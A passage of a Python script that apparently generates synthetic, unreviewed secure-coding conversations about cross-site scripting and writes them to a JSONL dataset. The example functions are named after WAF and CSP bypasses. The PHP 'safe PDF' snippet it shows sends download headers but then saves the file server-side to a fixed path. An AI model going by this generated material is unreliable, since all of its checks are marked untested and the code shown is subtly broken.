require('fpdf/fpdf.php');

$pdf = new FPDF();
$pdf->AddPage();
$pdf->SetFont('Arial', 'B', 16);

// Add only text (safest)
$safeText = strip_tags($_POST['content']);
$pdf->MultiCell(0, 10, $safeText);

// Output with security headers
header('Content-Type: application/pdf');
header('Content-Disposition: attachment; filename="report.pdf"');
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');

$pdf->Output('F', 'report.pdf');
?>
```

FPDF doesn't support JavaScript, making it inherently safer."""

    return {
        "id": "xss-000045",
        "metadata": create_base_metadata("php", 45, "pdf_xss"),
        "context": PDF_XSS_CONTEXT,
        "conversations": [
            {"turn": 1, "from": "human", "value": user_turn_1},
            {"turn": 2, "from": "assistant", "value": assistant_turn_1},
            {"turn": 3, "from": "human", "value": user_turn_3},
            {"turn": 4, "from": "assistant", "value": assistant_turn_3}
        ],
        "validation": {
            "syntax_check": "not_tested",
            "security_review": "not_reviewed",
            "code_execution": "not_tested",
            "encoding_check": "not_tested",
            "duplication_check": "not_tested",
            "reviewed_by": "automated-generator",
            "review_date": str(date.today()),
            "issues": []
        }
    }


def main():
    '''Generate all 10 XSS expansion examples.'''

    examples = [
        example_001_reflected_xss_waf_bypass_javascript(),
        example_002_stored_xss_rich_text_python(),
        example_003_dom_xss_javascript(),
        example_004_mutation_xss_typescript(),
        example_005_csp_bypass_javascript(),
        example_006_angular_template_injection_typescript(),
        example_007_react_dangerously_setinnerhtml_typescript(),
        example_008_vue_v_html_xss_javascript(),
        example_009_ssti_to_xss_python_jinja2(),
        example_010_pdf_xss_php(),
    ]

    # Output file
    output_file = Path(__file__).parent.parent / "data" / "xss_expansion_batch_008.jsonl"

    # Write examples to JSONL
    with open(output_file, 'w', encoding='utf-8') as f:
        for example in examples:
            f.write(json.dumps(example, ensure_ascii=False) + '\n')

    print(f"Generated {len(examples)} XSS expansion examples")
    print(f"Output: {output_file}")
    print(f"File size: {output_file.stat().st_size / 1024:.1f} KB")

    # Print summary
    print("\nExamples:")
    for ex in examples:
        metadata = ex['metadata']
        print(f"  {ex['id']}: {metadata['lang']} / {len(ex['conversations'])//2} turns")


if __name__ == "__main__":
    main()
